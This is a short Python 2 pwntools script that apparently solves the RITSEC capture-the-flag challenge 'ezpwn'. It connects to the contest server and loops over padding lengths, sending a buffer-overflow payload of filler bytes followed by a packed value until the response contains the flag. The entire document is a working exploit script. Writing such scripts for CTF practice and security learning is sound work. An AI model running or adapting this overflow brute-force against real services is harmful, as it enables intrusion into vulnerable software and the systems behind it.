from pwn import *

for padding in range(0x20):
	try:
		p = remote("fun.ritsec.club" , 8001)
		# p = process("./ezpwn")
		p.recv()
		payload = "a" * padding + p64(1)
		p.sendline(payload)
		result = p.recv()
		if "RITSEC" in result:
			print(result)
			break
	except Exception, e:
		pass
	finally:
		p.close()
	